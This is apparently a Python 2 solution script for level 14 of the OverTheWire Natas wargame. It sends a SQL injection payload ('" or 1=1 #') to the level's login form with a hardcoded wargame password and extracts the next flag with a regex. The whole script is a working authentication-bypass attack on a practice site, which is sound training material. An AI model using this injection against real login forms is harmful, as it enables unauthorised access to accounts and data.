#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level14.py
  Solution for natas level14
"""
__author__ = 'kall.micke@gmail.com'

import requests
import sys
import os
import re

level = 14
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

def get_flag():

    _payload = dict(username="hacker\" or 1=1 # ;--", password="1337")

    r = requests.post(host, data=_payload, auth=(user, password))
    m = re.search(r'([A-Za-z0-9]{30,})', r.text[750:])
    return m.group()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
